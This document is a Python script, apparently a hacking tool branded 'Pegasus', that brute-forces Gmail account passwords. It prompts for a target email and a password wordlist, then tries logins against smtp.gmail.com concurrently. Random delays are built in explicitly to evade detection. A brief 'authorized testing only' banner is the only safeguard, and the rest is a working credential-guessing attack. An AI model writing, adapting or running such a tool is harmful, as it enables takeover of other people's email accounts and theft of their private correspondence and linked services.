import os
import time
import smtplib
import threading
import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Clear screen
os.system('clear')

# Banner
print("""
██╗    ██╗███████╗██████╗ ███████╗███╗   ███╗ █████╗ ██╗██╗     
██║    ██║██╔════╝██╔══██╗██╔════╝████╗ ████║██╔══██╗██║██║     
██║ █╗ ██║█████╗  ██████╔╝█████╗  ██╔████╔██║███████║██║██║     
██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
╚███╔███╔╝███████╗██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
Pegasus Since 2026
                                                                                                   
""")

class EmailBruteForcer:
    def __init__(self):
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.delay_times = [0.3, 0.5, 0.7, 1.0, 1.2]  # Variable delays
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]

    def check_email_existence(self, email):
        """Check if email exists using different methods"""
        try:
            # Method 1: Try to get MX records
            import dns.resolver
            domain = email.split('@')[1]
            try:
                mx_records = dns.resolver.resolve(domain, 'MX')
                if mx_records:
                    return True
            except:
                pass
        except ImportError:
            pass
        
        return True  # Assume email exists if we can't verify

    def smart_delay(self):
        """Random delay to avoid detection"""
        time.sleep(random.choice(self.delay_times))

    def test_smtp_server(self, email):
        """Test different SMTP servers and ports"""
        smtp_servers = [
            ("smtp.gmail.com", 587),  # TLS
            ("smtp.gmail.com", 465),  # SSL
            ("smtp.gmail.com", 25),   # Standard
        ]
        
        for server, port in smtp_servers:
            try:
                print(f"\033[1;36m Testing {server}:{port}...")
                if port == 587:
                    smtp = smtplib.SMTP(server, port)
                    smtp.starttls()
                else:
                    smtp = smtplib.SMTP_SSL(server, port)
                
                smtp.ehlo()
                print(f"\033[1;32m ✓ {server}:{port} is available")
                return smtp
            except Exception as e:
                print(f"\033[1;31m ✗ {server}:{port} failed: {e}")
                continue
        
        return None

    def try_password(self, email, password, smtp_server):
        """Attempt to login with a password"""
        with self.lock:
            self.attempts += 1
            current_attempt = self.attempts

        if self.found_password:
            return False

        try:
            # Try login
            smtp_server.login(email, password)
            
            with self.lock:
                self.found_password = password
                print(f"\n\033[1;32m" + "="*60)
                print(f" ✓ PASSWORD FOUND!")
                print(f" Email: {email}")
                print(f" Password: {password}")
                print(f" Total Attempts: {current_attempt}")
                print("="*60 + "\033[0m")
            return True

        except smtplib.SMTPAuthenticationError:
            if current_attempt % 10 == 0:
                print(f"\033[1;33m [{current_attempt}] Still searching... Last tried: {password[:10]}...")
            else:
                print(f"\033[1;31m [{current_attempt}] Failed: {password}")
            return False

        except smtplib.SMTPServerDisconnected:
            print(f"\033[1;31m [{current_attempt}] Server disconnected. Reconnecting...")
            return "reconnect"

        except smtplib.SMTPException as e:
            error_msg = str(e)
            if "Application-specific password required" in error_msg:
                print(f"\033[1;31m [{current_attempt}] 2FA detected. Requires app password.")
                return "2fa_detected"
            elif "Too many login attempts" in error_msg:
                print(f"\033[1;31m [{current_attempt}] Too many attempts. Account may be temporarily locked.")
                return "locked"
            else:
                print(f"\033[1;31m [{current_attempt}] SMTP Error: {error_msg}")
                return "error"

        except Exception as e:
            print(f"\033[1;31m [{current_attempt}] Unexpected error: {e}")
            return "error"

    def load_passwords(self, file_path):
        """Load and preprocess passwords"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            # Remove duplicates while preserving order
            seen = set()
            unique_passwords = []
            for pwd in passwords:
                if pwd not in seen:
                    seen.add(pwd)
                    unique_passwords.append(pwd)
            
            # Sort by length (shorter passwords first - often faster to check)
            unique_passwords.sort(key=len)
            
            return unique_passwords
        except Exception as e:
            print(f"\033[1;31m Error loading passwords: {e}")
            return []

    def brute_force_advanced(self, email, password_file_path, max_workers=3):
        """Advanced brute force with multiple strategies"""
        
        # Validate inputs
        if "@" not in email or "." not in email.split("@")[-1]:
            print("\033[1;31m Invalid email format!")
            return

        if not os.path.exists(password_file_path):
            print("\033[1;31m Password file not found!")
            return

        # Check email existence
        print("\033[1;36m Checking email existence...")
        if not self.check_email_existence(email):
            print("\033[1;31m Email domain appears invalid!")
            return

        # Load and prepare passwords
        print("\033[1;36m Loading and preprocessing passwords...")
        passwords = self.load_passwords(password_file_path)
        
        if not passwords:
            print("\033[1;31m No valid passwords found in file!")
            return

        print(f"\033[1;36m Loaded {len(passwords)} unique passwords")
        print("\033[1;33m Starting advanced brute force attack...\n")

        # Test SMTP servers
        print("\033[1;36m Testing available SMTP servers...")
        smtp_server = self.test_smtp_server(email)
        if not smtp_server:
            print("\033[1;31m No SMTP servers available!")
            return

        start_time = time.time()
        found = False

        try:
            # Use thread pool for concurrent attempts
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_password = {
                    executor.submit(self.try_password, email, password, smtp_server): password 
                    for password in passwords[:1000]  # Limit for demo
                }

                for future in as_completed(future_to_password):
                    password = future_to_password[future]
                    try:
                        result = future.result()
                        if result is True:
                            found = True
                            executor.shutdown(wait=False)
                            break
                        elif result == "reconnect":
                            # Reconnect logic
                            smtp_server = self.test_smtp_server(email)
                            if not smtp_server:
                                break
                        elif result in ["2fa_detected", "locked"]:
                            break
                    except Exception as e:
                        print(f"\033[1;31m Thread error for password {password}: {e}")

                    # Smart delay between attempts
                    self.smart_delay()

        except KeyboardInterrupt:
            print("\n\033[1;33m Attack interrupted by user!")

        finally:
            # Cleanup
            try:
                smtp_server.quit()
            except:
                pass

        # Final results
        elapsed_time = time.time() - start_time
        print("\n\033[1;36m" + "="*60)
        if found:
            print(" ✓ ATTACK SUCCESSFUL!")
        else:
            print(" ✗ ATTACK COMPLETED - Password not found")
        print(f" Total attempts: {self.attempts}")
        print(f" Time elapsed: {elapsed_time:.2f} seconds")
        print(f" Speed: {self.attempts/elapsed_time:.2f} attempts/second")
        print("="*60 + "\033[0m")

def main():
    # Warning message
    print("\033[1;33m" + "="*70)
    print(" WARNING: FOR AUTHORIZED SECURITY TESTING ONLY!")
    print(" Use only on accounts you own or have explicit written permission to test.")
    print(" Unauthorized access is illegal and punishable by law!")
    print("="*70 + "\033[0m")

    print("\033[1;31m Security Notes:")
    print(" • Gmail has advanced protection mechanisms")
    print(" • 2FA-enabled accounts require app passwords")
    print(" • Multiple failed attempts may trigger account locks")
    print(" • This tool is for educational purposes only\033[0m\n")

    brute_forcer = EmailBruteForcer()
    
    email = input("\033[1;35m Enter target email: ").strip()
    password_file = input("\033[1;35m Enter password file path: ").strip()
    
    try:
        workers = int(input("\033[1;35m Enter number of concurrent workers (1-5, recommended 3): ").strip() or "3")
        workers = max(1, min(5, workers))  # Limit between 1-5
    except:
        workers = 3

    print(f"\n\033[1;36m Starting attack with {workers} concurrent workers...")
    time.sleep(2)
    
    brute_forcer.brute_force_advanced(email, password_file, workers)

if __name__ == "__main__":
    main()